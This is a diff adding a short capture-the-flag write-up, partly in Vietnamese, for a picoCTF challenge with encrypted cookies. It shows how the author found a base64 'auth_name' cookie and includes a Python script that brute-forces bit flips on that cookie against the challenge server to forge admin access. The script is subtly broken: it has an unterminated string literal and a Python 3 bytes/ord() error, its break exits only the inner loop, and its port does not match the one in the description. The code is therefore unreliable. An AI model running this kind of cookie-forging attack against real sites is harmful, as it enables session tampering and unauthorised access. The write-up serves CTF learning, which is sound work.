@@ -1,0 +1,43 @@
+## Description
+
+I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! http://mercury.picoctf.net:56136/
+
+## Solution
+
+![image](https://github.com/yeuubonn2k4/Pico/assets/161863346/3af130a9-3f80-45d1-90f9-5a1b5d487f7d)
+
+- Instpect -> Application -> Cookies
+
+![image](https://github.com/yeuubonn2k4/Pico/assets/161863346/ccbc75ce-937d-42ae-94d3-40aac589e2d4)
+
+- Phan admin co 1 ma base64 nhung cop len kt.gy no k dich duoc
+
+![image](https://github.com/yeuubonn2k4/Pico/assets/161863346/4b574930-f015-4a16-9499-0fe1c378fa9f)
+
+- Day la 1 thuat toan nen ta cop vao va chay python
+
+VWlqSkU4RTNpYnVFWGQveEpkVXJobW1tQUFhSDRWQzZ5Q1Vud1dYaVpYWFNrK3JnWUMxL05kN2VWL0ZRakRqWjN4ZUFCU1dhWjRHTlBQLy82QjhxQXE5UHpLekJoZ1VTTlhYbkI3ZERDakdRUDAvT1BNV2lOcWpGUjRXT2pDVVc=
+
+from base64 import b64decode
+from base64 import b64encode
+import requests
+
+def bitFlip( pos, bit, data):
+    raw = b64decode(data)
+
+    list1 = list(raw)
+    list1[pos] = chr(ord(list1[pos])^bit)
+    raw = ''.join(list1)
+    return b64encode(raw)
+
+ck = "VWlqSkU4RTNpYnVFWGQveEpkVXJobW1tQUFhSDRWQzZ5Q1Vud1dYaVpYWFNrK3JnWUMxL05kN2VWL0ZRakRqWjN4ZUFCU1dhWjRHTlBQLy82QjhxQXE5UHpLekJoZ1VTTlhYbkI3ZERDakdRUDAvT1BNV2lOcWpGUjRXT2pDVVc=
+="
+
+for i in range(128):
+  for j in range(128):
+    c = bitFlip(i, j, ck)
+    cookies = {'auth_name': c}
+    r = requests.get('http://mercury.picoctf.net:25992/', cookies=cookies)
+    if "picoCTF{" in r.text:
+      print(r.text)
+      break
